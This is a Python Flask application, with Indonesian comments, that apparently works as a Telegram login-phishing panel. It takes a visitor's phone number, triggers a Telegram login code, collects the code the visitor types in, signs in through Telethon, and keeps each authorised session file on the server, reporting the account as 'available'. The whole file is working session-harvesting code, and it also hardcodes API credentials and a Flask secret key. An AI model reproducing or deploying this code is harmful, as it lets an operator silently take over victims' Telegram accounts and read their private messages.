import asyncio
import os
import logging
from flask import Flask, render_template, request, redirect, url_for, flash
from telethon import TelegramClient
import nest_asyncio

# Aktifkan nest_asyncio untuk menangani event loop
nest_asyncio.apply()

# Buat event loop global
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Masukkan API_ID dan API_HASH Anda langsung di sini
API_ID = '20115110'
API_HASH = '192c9900730edbd7e03fe772e3f8810d'

# Secret key untuk session Flask
SECRET_KEY = 'ManusiaHebat'

# Pastikan folder untuk sesi ada
SESSION_FOLDER = "Session"
os.makedirs(SESSION_FOLDER, exist_ok=True)

# Logging untuk mencatat error
logging.basicConfig(filename="app.log", level=logging.ERROR)

app = Flask(__name__)
app.secret_key = SECRET_KEY  # Gunakan SECRET_KEY yang sudah didefinisikan

# Dictionary untuk menyimpan client
clients = {}

def run_async(coro):
    """Helper function untuk menjalankan coroutine."""
    return loop.run_until_complete(coro)

async def init_client(phone_number, session_file):
    """Inisialisasi client."""
    if phone_number not in clients:
        client = TelegramClient(session_file, API_ID, API_HASH, loop=loop)
        await client.connect()
        clients[phone_number] = client
    return clients[phone_number]

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        phone_number = request.form.get("phone_number").strip()

        # Tambahkan +62 jika nomor tidak dimulai dengan "+"
        if not phone_number.startswith("+"):
            phone_number = "+62" + phone_number

        # Hapus spasi atau karakter tak diinginkan
        session_file = os.path.join(SESSION_FOLDER, f"{phone_number.replace('+', '').replace(' ', '')}.session")

        try:
            async def send_code():
                client = await init_client(phone_number, session_file)
                if not await client.is_user_authorized():
                    await client.send_code_request(phone_number)

            run_async(send_code())
            return redirect(url_for("otp", phone_number=phone_number))

        except Exception as e:
            logging.error(f"Error in index: {str(e)}")
            flash(f"Terjadi kesalahan: {str(e)}")
            if phone_number in clients:
                client = clients[phone_number]
                run_async(client.disconnect())
                del clients[phone_number]
            return redirect(url_for("index"))

    return render_template("index.html")

@app.route("/otp/<phone_number>", methods=["GET", "POST"])
def otp(phone_number):
    if phone_number not in clients:
        flash("Sesi tidak ditemukan. Mulai ulang.")
        return redirect(url_for("index"))

    if request.method == "POST":
        otp = request.form.get("otp").strip()
        client = clients[phone_number]

        try:
            async def verify_code():
                await client.sign_in(phone_number, otp)
                user = await client.get_me()
                await client.disconnect()
                return user.first_name if user.first_name else "Pengguna"

            user_name = run_async(verify_code())
            flash(f"Tersedia {user_name} ({phone_number}).")

            # Bersihkan client
            if phone_number in clients:
                del clients[phone_number]

            return redirect(url_for("index"))

        except Exception as e:
            logging.error(f"Error in OTP verification: {str(e)}")
            flash(f"OTP salah atau terjadi kesalahan: {str(e)}")

            # Bersihkan client jika terjadi error
            if phone_number in clients:
                run_async(client.disconnect())
                del clients[phone_number]
            return redirect(url_for("index"))

    return render_template("otp.html", phone_number=phone_number)

@app.errorhandler(Exception)
def handle_error(error):
    logging.error(f"Unhandled error: {str(error)}")
    flash("Terjadi kesalahan, coba lagi nanti.")
    return redirect(url_for("index"))

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=5000, debug=False)  # Jalankan Flask di semua interface
    finally:
        # Cleanup saat aplikasi berhenti
        for client in clients.values():
            run_async(client.disconnect())
        loop.close()
